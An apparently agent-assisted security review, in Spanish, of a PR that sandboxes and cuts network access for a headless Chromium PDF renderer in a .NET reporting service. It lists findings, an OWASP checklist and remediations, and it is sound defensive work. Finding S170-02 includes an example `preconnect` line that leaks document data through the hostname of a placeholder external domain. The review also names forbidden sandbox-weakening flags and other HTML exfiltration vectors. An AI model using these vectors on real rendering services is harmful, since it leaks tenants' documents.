# Revisión de seguridad del PR #170 (T4-03a): Chromium del render aislado y sin red

- Fecha: 2026-10-22 · Revisor: auditor-seguridad (equipo A), con Opus
- PR: #170, rama `b/ola5-t4-03a`, punta `f534e7f0e961906a8a2474941b85999a285842cc`, base `feature/modelo-ng`; 11 archivos, +1469/-31
- Método: solo lectura (`git show origin/b/ola5-t4-03a:<ruta>`, `gh pr view 170`, cadenas del ensamblado de PuppeteerSharp 25.12.0 en la caché de NuGet). No compilé ni ejecuté pruebas: los resultados de las pruebas que se citan son los que declara el PR, no los comprobé.
- Marcas: [V] verificado leyendo el código de la rama; [I] inferido (comportamiento de Chromium, PuppeteerSharp o Windows que no comprobé en ejecución).

## 1. Resumen y recomendación

**Recomendación: Aprobar con condiciones.** Es una recomendación técnica; la firma es del propietario (C2).

El núcleo está bien hecho y cumple las decisiones firmadas que se pueden comprobar en el código:

- nunca `--no-sandbox`: los argumentos son constantes y no salen de la configuración;
- CDP por tubería, sin puerto de depuración;
- JavaScript apagado en todas las páginas y en todos los modos (D-T403-2), con el alto del rollo medido por `DOM.getBoxModel`;
- intercepción como lista blanca que, cuando falla, aborta la petición (falla cerrada);
- M-170-2 implementado: un `data:` usado como documento corta el render;
- el perfil en `%ProgramData%\GPOS NG\Reportes\render`, con limpieza de los huérfanos al arrancar;
- 503 si la carpeta no se comprobó.

No encontré hallazgos Críticos ni Altos. Encontré **5 Medios** y **6 Bajos**. De esos, dos Medios son incumplimientos de condiciones firmadas y conviene cerrarlos **antes de unir**:

- **S170-01**: la comprobación de la carpeta no verifica a los **lectores**. DM-11 pide que los usuarios autenticados no puedan leer, y la raíz de ADR-77 se los da por herencia.
- **S170-02**: **M-170-1** está incompleta. P-03 y P-04 no llevan los vectores `preconnect`, `dns-prefetch` ni `prefetch`, y lo más probable es que la capa 1 sola **no** frene `preconnect`. La afirmación «cada capa corta sola» no está demostrada para ese vector.

Los otros tres Medios (S170-03 a S170-05) pueden pasar a T4-03b o a devops como condiciones con fecha. Ninguno de ellos admite formatos personalizados de terceros en producción sin cerrarlo.

## 2. Alcance y superficie revisada

| Archivo | Qué revisé |
|---|---|
| `src/GPOS.Reportes.Api/Impresion/ConvertidorPdf.cs` | Lanzamiento, perfil, contexto por render, intercepción, rechazo de `data:`, alto por CDP, cierre y limpieza |
| `src/GPOS.Reportes.Api/Impresion/PoliticaRedNavegador.cs` | Argumentos de la capa 2, prohibidos, lista blanca y registro del origen |
| `src/GPOS.Reportes.Api/Impresion/OpcionesRender.cs` | Opciones internas de prueba, topes |
| `src/GPOS.Reportes.Api/Impresion/ServicioRender.cs` | Saneo del logo, camino de los formatos personalizados |
| `src/GPOS.Reportes.Api/Program.cs`, `Endpoints/EndpointsRender.cs`, `GPOS.Reportes.Api.csproj` | Orden de arranque, plazo de 30 s, cupo, `InternalsVisibleTo` |
| `src/GPOS.Reportes/Exportacion/ComprobacionCarpetas.cs` (no cambia en el PR, pero se reutiliza) | Reglas de ADR-77 aplicadas a `render` |
| `src/GPOS.Reportes.Api/Impresion/ServiciosRender.cs` (no cambia) | Precalentamiento |
| `tests/GPOS.Reportes.Tests/ChromiumAisladoTests.cs` | P-01 a P-13 y la política sin navegador |

Superficie: el render solo se alcanza por la canalización interna de la principal (`EndpointsRender.cs:69` [V]). El contenido hostil llega en la plantilla (Razor o diseño gráfico) que escriben el SUPER o el diseñador de una empresa, y en los datos del modelo. El proceso de Chromium es hijo de un servicio que abre los sobres de lectura de todas las empresas del sitio.

## 3. Tabla resumen de hallazgos

| ID | Severidad | Título |
|---|---|---|
| S170-01 | Media | La carpeta `render` no se comprueba contra lectores (DM-11: sin lectura para usuarios autenticados) |
| S170-02 | Media | M-170-1 incompleta: P-03/P-04 sin `preconnect`/`dns-prefetch`/`prefetch`; la capa 1 sola probablemente no corta `preconnect` |
| S170-03 | Media | Una directiva de grupo de proxy de Chrome o Edge anula `--proxy-server` (capa 2) sin aviso [I] |
| S170-04 | Media | Sin tope de memoria ni de CPU del árbol de Chromium: denegación de servicio en un servidor de 8 GB compartido con SQL Server (Job Object en T4-03b) |
| S170-05 | Media | El navegador corre con el token y el entorno completos del servicio: un escape del sandbox da acceso a los sobres de todas las empresas (riesgo residual de arquitectura) |
| S170-06 | Baja | El nombre del perfil sale de `Guid.NewGuid()` (122 bits), no de `RandomNumberGenerator` con 128 bits; el perfil se crea sin comprobar reanálisis ni que exista de antes |
| S170-07 | Baja | Chromium hereda todo el entorno del servicio (variables de configuración y posibles secretos) |
| S170-08 | Baja | La línea de comandos efectiva solo se comprueba en las pruebas, no al lanzar; ninguna prueba usa una ruta de perfil con espacios (la de producción tiene «GPOS NG») |
| S170-09 | Baja | El proxy muerto `127.0.0.1:9` lo puede ocupar cualquier usuario local |
| S170-10 | Baja | Huecos en las pruebas: 9 casos de P-02 no prueban nada, faltan vectores, no se prueba el `catch` de la intercepción y no se probó Edge |
| S170-11 | Baja | Sin vigilancia de un navegador colgado; ruta del navegador configurable sin límite (T4-03b) |

## 4. Checklist OWASP (aplicado a este cambio)

| Punto | Resultado |
|---|---|
| A01 Control de acceso | Bien: render solo por la canalización interna (`EndpointsRender.cs:69` [V]); 503 sin carpeta comprobada (`ConvertidorPdf.cs:329` [V]). Aislamiento entre empresas: un contexto incógnito por render (`ConvertidorPdf.cs:143,179` [V]). Ver S170-01 y S170-05 |
| A02 Criptografía | No aplica directamente; S170-06 (aleatoriedad del nombre del perfil) |
| A03 Inyección | Argumentos de Chromium constantes, sin datos externos (`ConvertidorPdf.cs:353`, `PoliticaRedNavegador.cs:20-40` [V]). El HTML de la plantilla es contenido hostil por diseño: lo contienen las capas 1 y 2 y el JavaScript apagado. La compilación Razor de plantillas queda fuera de este PR (ver la sección 9) |
| A04 Diseño inseguro | S170-05 (mismo token que el servicio), S170-03 |
| A05 Configuración | S170-01, S170-03, S170-08, S170-11 |
| A06 Componentes vulnerables | PuppeteerSharp 25.12.0 (`GPOS.Reportes.Api.csproj:21` [V]): no conozco vulnerabilidades publicadas de esta versión y no hay herramienta de auditoría en esta revisión. El riesgo real está en el Chrome o Edge instalado, que no se fija ni se comprueba (S170-11). Por la política del proyecto, no propongo actualizar |
| A07 Autenticación | No aplica (no cambia) |
| A08 Integridad | S170-08 (sin comprobación al lanzar), S170-11 (ruta del ejecutable) |
| A09 Registro y monitoreo | Bien: 5117 sin ruta ni consulta, y el anfitrión como `*` si es un nombre (`PoliticaRedNavegador.cs:80-92` [V]); tope de 5 eventos por render (`ConvertidorPdf.cs:464-478` [V]); 5119 crítico (`ConvertidorPdf.cs:99` [V]) |
| A10 SSRF | Es el objetivo del PR: capas 1 y 2. Ver S170-02, S170-03 y S170-09 |

## 5. Hallazgos

### S170-01 · Media · La carpeta `render` no se comprueba contra lectores

- **Riesgo.** DM-11 pide una DACL protegida **sin lectura para usuarios autenticados**. `PrepararCarpeta` reutiliza `ComprobacionCarpetas.PrepararTemporales`, que solo evalúa al dueño y a los **escritores** (máscara `0x500D0156`).
- **Evidencia.**
  - `ConvertidorPdf.cs:87-103` [V] delega en `ComprobacionCarpetas.cs:142-197` [V].
  - `Evaluar` (`ComprobacionCarpetas.cs:65-87` [V]) ignora las ACE de solo lectura.
  - La raíz del vector concede lectura heredable a los usuarios autenticados: `SddlRaiz = ...(A;OICI;0x1200a9;;;AU)` (`ComprobacionCarpetas.cs:36` [V]).
  - `render` se crea **por herencia** (`ComprobacionCarpetas.cs:183-186` [V]). Si el MSI no protege `Reportes` sin la ACE de AU (es trabajo de devops, todavía pendiente según el PR), `render` y cada `perfil-*` quedan legibles por cualquier usuario autenticado del equipo.
- **Escenario de abuso.** Un cajero o cualquier usuario con sesión en el servidor de la sucursal, que suele ser un equipo compartido, lee el perfil. Ahí pueden estar los volcados de fallos de crashpad (memoria del renderizador con el documento de otra empresa), la carpeta `tmp` del navegador (`ConvertidorPdf.cs:343,355-356` [V]) y los restos de un perfil que no se pudo borrar. Que crashpad escribe en el perfil lo confirma el propio PR (`ChromiumAisladoTests.cs:568-571` [V]); qué datos contiene un volcado es [I].
- **Remediación (la más barata).** Al crear `render`, el servicio le pone una DACL explícita y protegida: SYSTEM, Administradores y el SID del servicio, sin AU, Users ni Everyone. Si ya existe, se rechaza con un código nuevo, por ejemplo `LECTOR_NO_PERMITIDO`, cuando alguna ACE ajena tenga `FILE_READ_DATA`/`FILE_LIST_DIRECTORY`. Hace falta una prueba de rechazo y otra de creación. Esfuerzo: unas 0,5 a 1 jornada. Defensa en profundidad: el MSI protege `Reportes` sin AU (entrega a devops).

### S170-02 · Media · M-170-1 incompleta y «cada capa corta sola» sin demostrar para `preconnect`

- **Riesgo.** `<link rel=preconnect>` (y la resolución anticipada de nombres) no genera una petición en `Fetch.requestPaused`. Es una conexión de socket que abre la pila de red, así que la intercepción (capa 1) no la ve [I, comportamiento conocido de Chromium]. El diseño declara dos capas independientes que «cada una corta sola la salida» (`PoliticaRedNavegador.cs:4-11` [V]). Para este vector, lo más probable es que solo actúe la capa 2.
- **Evidencia.**
  - El vector existe en P-02 con **las dos capas encendidas** (`ChromiumAisladoTests.cs:203` [V]), lo que no aísla ninguna capa.
  - P-03 (`La_capa_2_sola_corta_la_red`, `:243-261` [V]) solo usa `<img>`.
  - P-04 (`La_capa_1_sola_corta_la_red`, `:294-308` [V]) solo usa `<link rel=stylesheet>` e `<img>`.
  - M-170-1 pide los tres vectores en P-03 y P-04: no están.
  - La capa 0 (CSP o saneo) está en T4-03b según el cuerpo del PR, lo que es coherente con M-170-1.
- **Escenario de abuso.** Si la capa 2 falla o queda anulada (ver S170-03), una plantilla con `<link rel=preconnect href="https://<dato-del-documento>.dominio-externo">` abre una conexión (y la resolución del nombre) hacia fuera, y el dato viaja en el nombre del anfitrión. Esa salida no queda registrada en 5117.
- **Remediación.**
  1. Agregar los tres vectores a P-03 (debe pasar) y a P-04. Si P-04 falla con `preconnect`, documentarlo como limitación conocida de la capa 1, corregir la frase «cada una corta sola» y dejar la capa 0 de T4-03b como el control que cubre ese vector, eliminando `rel=preconnect|dns-prefetch|prefetch|prerender|preload|modulepreload` del HTML antes del render.
  2. Agregar también `<script type="speculationrules">` (prefetch o prerender) a P-03 y P-04 [I: no sé si Chromium procesa las reglas de especulación con el JavaScript apagado; hay que probarlo].
  - Esfuerzo: unas 0,5 jornadas.

### S170-03 · Media · Una directiva de grupo de proxy anula la capa 2 [I]

- **Riesgo.** En Chrome y Edge, las preferencias administradas por directiva tienen prioridad sobre las que fija la línea de comandos. Si el servidor está en un dominio con `ProxySettings`, `ProxyMode` o `ProxyServer` en `HKLM\SOFTWARE\Policies\Google\Chrome` o `...\Microsoft\Edge`, la directiva sustituye a `--proxy-server=http://127.0.0.1:9` y a `<-loopback>`. Las peticiones salen entonces por el proxy de la empresa, que resuelve los nombres por su cuenta: `--host-resolver-rules` no se aplica a lo que va por proxy. Las directivas que fuerzan extensiones (`ExtensionInstallForcelist`) podrían cargar extensiones a pesar de `--disable-extensions` [I].
- **Evidencia.** Los argumentos de la capa 2 están en `PoliticaRedNavegador.cs:23-37` [V]. No hay ninguna lectura de directivas del navegador en el arranque ni en `NavegadorAsync` (`ConvertidorPdf.cs:322-373` [V]). El PR declara que no se probó Edge ni un equipo con directivas.
- **Escenario de abuso.** En un cliente con dominio y proxy corporativo por GPO, la capa 2 desaparece sin aviso. Las salidas que la capa 1 no ve (S170-02) llegan al proxy corporativo con el nombre del anfitrión, que puede llevar datos del documento.
- **Remediación (barata).** Al lanzar, leer esas claves del registro de HKLM (las de HKCU de la cuenta virtual también, si existen). Si hay una directiva de proxy o de extensiones forzadas, dejar el evento 5118 crítico y no habilitar los formatos personalizados (503), salvo que la capa 3 (regla de salida por SID del servicio) esté comprobada. Esfuerzo: unas 0,5 jornadas. Alternativa más cara, descartada por ahora: distribuir un `chrome-headless-shell` propio (unos 150 MB por instalación y actualizaciones a cargo de GPOS) [I: no confirmé si ese binario lee las mismas directivas].

### S170-04 · Media · Sin tope de memoria ni de CPU del árbol de Chromium

- **Riesgo.** Hay una sola instancia del navegador con hasta 4 renders a la vez (`OpcionesRender.cs:31` [V]) y un cuerpo de hasta 16 MB (`OpcionesRender.cs:52` [V]). El plazo de 30 s abandona la respuesta (`EndpointsRender.cs:70-82` [V]), pero el cupo se devuelve solo cuando el trabajo termina (`:80-81` [V]). El cierre del contexto (`ConvertidorPdf.cs:303-313` [V]) no tiene plazo propio: depende del plazo del protocolo de PuppeteerSharp [I: 180 s por omisión]. Ningún límite acota la memoria del árbol de procesos. El Job Object está en T4-03b.
- **Escenario de abuso.** Un formato personalizado con CSS o DOM explosivo (millones de nodos, sombras y filtros anidados) se imprime cuatro veces seguidas. Los renderizadores consumen varios GB en un servidor de 8 GB que también tiene SQL Server y la API principal, la paginación degrada el POS de la sucursal, y basta con repetir la impresión para mantener el efecto.
- **Remediación.** T4-03b con Job Object (`JOB_OBJECT_LIMIT_JOB_MEMORY`, por ejemplo de 1 a 1,5 GB para el árbol, y `KILL_ON_JOB_CLOSE`). Además, un `WaitAsync` de unos 10 s sobre `CerrarContextoAsync`: si vence, se desecha el navegador entero. Condición: T4-03b unido antes de habilitar formatos personalizados de terceros fuera del DEMO.

### S170-05 · Media · El navegador corre con el token y el entorno del servicio (riesgo residual)

- **Riesgo.** PuppeteerSharp lanza el navegador con `Process.Start` bajo la cuenta `NT SERVICE\GPOS.Reportes`, sin token restringido ni otra cuenta (`ConvertidorPdf.cs:348-357` [V]; el mecanismo de PuppeteerSharp es [I]). Un proceso del mismo usuario y con la misma integridad puede, por lo general, abrir el proceso padre con lectura de memoria [I] y leer los archivos y llaves a los que llega el servicio. El sandbox del renderizador es la única barrera (decisión firmada: nunca `--no-sandbox`, cumplida). Con el JavaScript apagado, la superficie del renderizador baja mucho, pero quedan los analizadores de imágenes, fuentes y CSS de los `data:` admitidos.
- **Escenario de abuso.** Una cadena de dos fallas: corrupción de memoria en el renderizador mediante una fuente o imagen `data:` maliciosa en la plantilla, más un escape del sandbox. Con eso se obtiene un proceso con la identidad del servicio, que abre los sobres de lectura de **todas** las empresas. Es poco probable, pero el impacto sería crítico.
- **Remediación (decisión de arquitectura).** Lanzar el navegador bajo otra identidad sin acceso a los sobres (por ejemplo, un servicio auxiliar `NT SERVICE\GPOS.Render` que reciba el HTML por una canalización), o como mínimo con un token restringido o de integridad baja. Esfuerzo: unas 1 a 2 semanas-persona. Mientras tanto: mantener Chrome o Edge al día (S170-11) y la DACL del proceso del servicio sin `PROCESS_VM_READ` para su propio SID [I: verificar que sea viable].

### S170-06 · Baja · Aleatoriedad y creación del perfil

- **Evidencia.**
  - `Path.Combine(carpeta, PrefijoPerfil + Guid.NewGuid().ToString("N"))` (`ConvertidorPdf.cs:342` [V]): un GUID v4 tiene 122 bits aleatorios [I: en Windows salen de un generador criptográfico], no 128. El comentario y P-10 dicen «128 bits» (`ChromiumAisladoTests.cs:548,558` [V]).
  - `Directory.CreateDirectory(temporal)` (`ConvertidorPdf.cs:344` [V]) no falla si el perfil ya existe y sigue una unión si alguien la puso antes.
  - El identificador de `render` no queda retenido (solo la raíz y el componente: `ComprobacionCarpetas.cs:166-167` [V]).
- **Riesgo.** Bajo: para preparar el ataque hace falta escribir en `render`, que ADR-77 reserva a cuentas privilegiadas. Es un incumplimiento literal de DM-11.
- **Remediación.** Usar `Convert.ToHexString(RandomNumberGenerator.GetBytes(16))`. Comprobar que el perfil no existe antes de crearlo y que, después, no es un punto de reanálisis (con `IdentificadorCarpeta`); si cualquiera de las dos falla, abortar el lanzamiento. Esfuerzo: menos de 2 horas.

### S170-07 · Baja · Chromium hereda todo el entorno del servicio

- **Evidencia.** `LaunchOptions.Env` se suma al entorno heredado y no lo sustituye; lo afirma P-10 (`ChromiumAisladoTests.cs:560-563` [V]). Solo se cambian `TEMP` y `TMP` (`ConvertidorPdf.cs:355-356` [V]).
- **Riesgo.** Cualquier variable con secretos (por ejemplo, de configuración `GPOS__*` o `ConnectionStrings__*`, o una variable de máquina como la excepción K3 del DEMO si se fijó con alcance de máquina [I]) queda en el bloque de entorno de todos los procesos de Chromium. No encontré que la API de reportes lea secretos de variables de entorno [V: búsqueda en `src/GPOS.Reportes*` y `src/GPOS.Comun*`].
- **Remediación.** Antes de lanzar, vaciar o quitar del `Env` las variables con prefijos de configuración de .NET y de GPOS (`GPOS`, `Jwt`, `ConnectionStrings`, `ASPNETCORE_`, `DOTNET_`). Agregar una prueba que lea `StartInfo.Environment`. Esfuerzo: 1 a 2 horas.

### S170-08 · Baja · Comprobación de la línea de comandos solo en las pruebas; rutas con espacios

- **Evidencia.**
  - `Prohibidos` (`PoliticaRedNavegador.cs:46-51` [V]) solo se consulta en P-08 (`ChromiumAisladoTests.cs:483-507` [V]), no al lanzar.
  - El comentario de `PoliticaRedNavegador.cs:27-28` [V] advierte que PuppeteerSharp une los argumentos con espacios sin entrecomillar.
  - La ruta de producción `C:\ProgramData\GPOS NG\Reportes\render\perfil-…` tiene un espacio, y las pruebas usan `%TEMP%`, que normalmente no lo tiene.
  - El ensamblado de PuppeteerSharp contiene `QuoteArgument`, y probablemente entrecomilla `--user-data-dir` [I], pero ninguna prueba lo demuestra.
  - El ensamblado también contiene la cadena `--no-sandbox` [V por cadenas; no sé en qué camino se usa].
- **Riesgo.** Si `--user-data-dir` se partiera en el espacio, el perfil quedaría en `C:\ProgramData\GPOS`, con la DACL heredada de ProgramData (lectura y creación para Users), fuera de toda comprobación. Una actualización de PuppeteerSharp podría agregar un argumento sin que nadie lo note.
- **Remediación.** Después de `LaunchAsync`, pedir `Browser.getBrowserCommandLine`. Si aparece un prohibido, falta uno de `ArgumentosRed` o `--user-data-dir` no es exactamente el perfil, desechar el navegador, dejar el evento 5118 y responder 503 (falla cerrada). Agregar a P-08 una raíz con espacio. Esfuerzo: unas 0,5 jornadas.

### S170-09 · Baja · El proxy muerto lo puede ocupar un usuario local

- **Evidencia.** `Proxy = "http://127.0.0.1:9"`, fijo (`PoliticaRedNavegador.cs:17` [V]). En Windows, cualquier usuario puede escuchar en un puerto del loopback por debajo de 1024 [I]. Si están instalados los «Servicios TCP/IP simples», el servicio discard escucha en ese puerto.
- **Riesgo.** Lo que la capa 1 no ve (S170-02) llega a ese puerto. Un proceso local que escuche ahí recibe las conexiones, y con `https` también el `CONNECT anfitrión:443`, que puede llevar datos en el nombre [I]. Con discard, las conexiones quedan colgadas hasta el plazo.
- **Remediación.** Que la capa 0 (T4-03b) elimine las sugerencias de recursos del HTML (S170-02). Opcionalmente, al arrancar, comprobar que nada escucha en `127.0.0.1:9` y dejar una advertencia si hay algo. Esfuerzo: menos de 2 horas.

### S170-10 · Baja · Huecos en las pruebas

- En P-02, los 9 casos con `gpos-prueba.invalid` (`ChromiumAisladoTests.cs:206` [V]) no prueban nada: la escucha está en el loopback y ese nombre no resuelve ni sin capas. No tienen control. Hay que quitarlos o darles un caso de control con las capas apagadas y `--host-resolver-rules=MAP gpos-prueba.invalid 127.0.0.1`.
- Faltan vectores:
  - `@import` en `<style>`;
  - `srcset` y `<picture><source>`;
  - SVG en línea con `<image href>`, `<use href>` y `<foreignObject>` que contenga un `<iframe>`;
  - `<link rel=preload|modulepreload|icon|manifest>`;
  - `<video poster>`, `<input type=image>`;
  - `<iframe srcdoc>` con `sandbox`;
  - `<frameset>`;
  - `<iframe loading=lazy src="data:text/html,…">` fuera de la vista, para ver si se carga durante `PdfDataAsync` y después de la comprobación de `ConvertidorPdf.cs:168` [I];
  - reglas de especulación.
- No se prueba el `catch` de la intercepción (`ConvertidorPdf.cs:246-257` [V]); el PR lo reconoce. Una prueba con un `IRequest` falso que lance la excepción en `ContinueAsync` bastaría.
- No se probó Edge, el camino positivo de `PrepararCarpeta` en Release ni la cuenta `NT SERVICE\GPOS.Reportes` (laboratorio L-1 a L-4, según el PR).

### S170-11 · Baja · Navegador colgado y ruta del ejecutable

- **Evidencia.**
  - Solo se relanza el navegador si `IsClosed` (`ConvertidorPdf.cs:324,328` [V]). Uno que no responde pero sigue vivo hace fallar todos los renders por plazo hasta reiniciar el servicio.
  - `opciones.Navegador` acepta cualquier ruta (`ConvertidorPdf.cs:315-320` [V]). El archivo de instalación no admite esa clave (`ArchivoInstalacion.cs:27` [V]), pero `appsettings.json` y las variables de entorno del servicio sí [I].
  - No se registra ni se compara la versión del navegador, que es el componente con vulnerabilidades reales.
- **Remediación.** Tras N plazos vencidos seguidos (por ejemplo, 3), desechar y relanzar el navegador. Limitar la ruta a las carpetas de programas (ya previsto en T4-03b). Registrar `Browser.getVersion` al lanzar y advertir por debajo de una versión mínima configurable. Esfuerzo: unas 0,5 jornadas.

## 6. Estado de M-170-1 y M-170-2

| Condición | Estado | Evidencia |
|---|---|---|
| **M-170-1**: P-03 y P-04 con `preconnect`, `dns-prefetch` y `prefetch`; capa 0 en T4-03b | **No cumplida en las pruebas; la capa 0 sigue pendiente (aceptable).** Los vectores solo están en P-02, con las dos capas encendidas; P-03 y P-04 no los tienen. La capa 0 figura en «Qué queda pendiente» del PR (CSP en T4-03b) | `ChromiumAisladoTests.cs:203,243-261,294-308` [V]; cuerpo del PR [V] |
| **M-170-2**: un documento `data:` anidado corta el render | **Cumplida.** Un `data:` de un tipo que no sea imagen, fuente u hoja de estilo cancela el render, que responde 400 `FORMATO_INVALIDO`, sin PDF aunque la cancelación llegue tarde. Se prueba con `iframe`, `iframe sandbox`, `object`, `object type=text/html` y `embed`, más la comprobación de que, aun sin el corte, el marco no ejecuta guiones ni sale a la red. Faltan los vectores `srcdoc`, `frameset` y `loading=lazy` (S170-10) | `PoliticaRedNavegador.cs:57-73`, `ConvertidorPdf.cs:140-141,168,171-175,243,250` [V]; `ChromiumAisladoTests.cs:708-781` [V] |

## 7. Controles bien implementados

- **Sin `--no-sandbox` ni argumentos peligrosos.** Los argumentos son constantes, sin datos externos ni configuración (`ConvertidorPdf.cs:353`, `PoliticaRedNavegador.cs:20-40` [V]). P-08 comprueba la línea lanzada y la efectiva contra la lista de prohibidos, que incluye `--disable-web-security`, `--allow-file-access-from-files`, `--remote-debugging-port` y `--remote-debugging-address` (`ChromiumAisladoTests.cs:497-504` [V]).
- **CDP por tubería** (`Pipe = true`, `ConvertidorPdf.cs:352` [V]). P-08 exige `--remote-debugging-pipe`.
- **Capa 2 completa:** proxy muerto con `<-loopback>`, `--host-resolver-rules` entrecomillado (P-08 comprueba que llega sin las comillas), `--disable-background-networking`, `--disable-component-update`, `--disable-sync`, `--disable-domain-reliability`, `--no-pings`, `--dns-prefetch-disable` y la política de WebRTC. P-03 tiene controles positivos (`Control_con_las_capas_1_y_2_apagadas…` y el caso «proxy sin quitar la excepción del loopback»), así que las pruebas demuestran que detectan la salida.
- **Capa 1 como lista blanca** (solo `data:` de imagen, fuente u hoja de estilo, y exactamente `about:blank`; `file:`, `blob:`, `filesystem:`, `ftp:`, `ws:`, `chrome:` y `edge:` quedan fuera) con falla cerrada (`ConvertidorPdf.cs:231-258`, `PoliticaRedNavegador.cs:69-73` [V]). La intercepción se activa antes del primer contenido (`ConvertidorPdf.cs:216-221` antes de `:150` [V]). Si el manejador no responde, la petición queda colgada y el render vence en 30 s sin PDF [I].
- **JavaScript apagado en todas las páginas** antes de cargar nada (`ConvertidorPdf.cs:217` [V]): sin JavaScript no hay Service Workers, WebSocket, WebRTC, `fetch` ni `blob:` creados por un guion. P-05 lo comprueba en Razor y en el modo gráfico. La medición del rollo por `DOM.getBoxModel` se compara con la de T4-01 en los HTML dorados (P-06).
- **Un contexto incógnito por render**, cerrado en el `finally` (`ConvertidorPdf.cs:143,176-180` [V]); P-09 cubre las cancelaciones a mitad de camino.
- **Si el navegador se desconecta**, no sale PDF: la excepción sube y el siguiente render lanza otro navegador, con el perfil anterior borrado (`ConvertidorPdf.cs:331-334,376-395` [V]).
- **Falla cerrada por la carpeta.** Sin `PrepararCarpeta` aprobada no se lanza el navegador (`ConvertidorPdf.cs:329` [V]). En Release no se puede apagar la comprobación (`Program.cs:60-66` [V]). El precalentamiento arranca después de la comprobación (`Program.cs:94` frente a `:119` [V]).
- **Purga de huérfanos** que no sigue uniones y no toca el perfil en uso (`ConvertidorPdf.cs:120-132` [V]); hay una prueba con unión (`ChromiumAisladoTests.cs:579-609` [V]).
- **Saneo del logo** a `data:` de imagen con tipo y tope (`ServicioRender.cs:57-65` [V]).
- **Registro sin datos sensibles** (5117 sin ruta, consulta ni nombre de anfitrión; C10).
- **Opciones de prueba internas,** que la configuración no puede enlazar (`OpcionesRender.cs:58-67` [V], `InternalsVisibleTo` solo para `GPOS.Reportes.Tests`).

## 8. Remediaciones priorizadas

| # | Hallazgo | Cuándo | Esfuerzo |
|---|---|---|---|
| 1 | S170-01: comprobar o fijar la DACL de `render` sin lectores ajenos | Antes de unir | 0,5-1 jornada |
| 2 | S170-02: vectores de M-170-1 en P-03 y P-04; corregir la afirmación de las capas | Antes de unir | 0,5 jornada |
| 3 | S170-06, S170-08: 128 bits con `RandomNumberGenerator`, perfil sin reanálisis, comprobación de la línea de comandos al lanzar y ruta con espacios | Antes de unir (baratos) o al inicio de T4-03b | 0,5 jornada |
| 4 | S170-03: detectar directivas de proxy y extensiones | T4-03b | 0,5 jornada |
| 5 | S170-04: Job Object y plazo del cierre | T4-03b (ya previsto) | según T4-03b |
| 6 | S170-07, S170-09, S170-10, S170-11 | T4-03b | 1-1,5 jornadas en total |
| 7 | S170-05: identidad separada para el navegador | Decisión del propietario (ADR candidato) | 1-2 semanas-persona |

## 9. Lo que NO verifiqué

- No ejecuté ninguna prueba ni compilé. Los resultados (73 de 73, 19 mutaciones) son los que declara el PR.
- El comportamiento real de Chromium en: `preconnect` frente a `Fetch`, la prioridad de las directivas frente a la línea de comandos, las reglas de especulación sin JavaScript, la carga de iframes `lazy` al imprimir y el cierre del navegador cuando se corta la tubería. Todo eso está marcado [I].
- El código de PuppeteerSharp 25.12.0 (solo miré sus cadenas): si entrecomilla `--user-data-dir`, si `--disable-breakpad` está entre sus argumentos por omisión, en qué caso usa la cadena `--no-sandbox`, el plazo del protocolo por omisión, la herencia de manejadores con la tubería en Windows y si la intercepción cubre los iframes fuera de proceso. La prueba con `iframe sandbox` sugiere que sí cubre ese caso.
- Edge, la cuenta virtual del servicio, el camino positivo de `PrepararCarpeta` en Release y la ACL real que pondrá el MSI.
- El contenido real de los volcados de crashpad y si Edge los sube a Microsoft por su cuenta.
- Las vulnerabilidades de la versión instalada de Chrome o Edge en los equipos de los clientes.
- La compilación Razor en tiempo de ejecución de las plantillas (`MotorRazor`), que ejecuta código en el proceso de la API y está fuera de este PR. Conviene revisarla aparte: una plantilla Razor de un SUPER o un diseñador que llegue a ejecutar C# arbitrario sería más grave que un escape de Chromium.
- La lógica de `TurnosRender` y de `ErroresReportes` más allá de lo citado.

## 10. Decisiones candidatas a ADR

- **Identidad separada para el render con Chromium** (S170-05). Contexto: el navegador hereda el token del servicio que abre los sobres de todas las empresas. Opción propuesta: un proceso auxiliar con su propia cuenta virtual y sin acceso a los sobres, que reciba el HTML por una canalización. Alternativas descartadas: un token restringido, más barato pero frágil con Chromium (que ya restringe sus hijos) y sin cubrir al proceso del navegador; y no hacer nada, apoyándose solo en el sandbox, que es el estado actual.

## Entregas a otros agentes

- **devops / instalador:** la carpeta `Reportes` con la DACL protegida y sin AU, y la regla de salida del cortafuegos por SID del servicio (capa 3) que cubra también crashpad.
- **desarrollador del tramo 4 (B):** S170-01, S170-02, S170-06 y S170-08 antes de unir; el resto en T4-03b.
- **arquitecto-maestro:** el ADR candidato de S170-05.
- **qa-automatizado:** los vectores de S170-10 y el laboratorio L-1 a L-4 con Edge y con directivas de grupo.
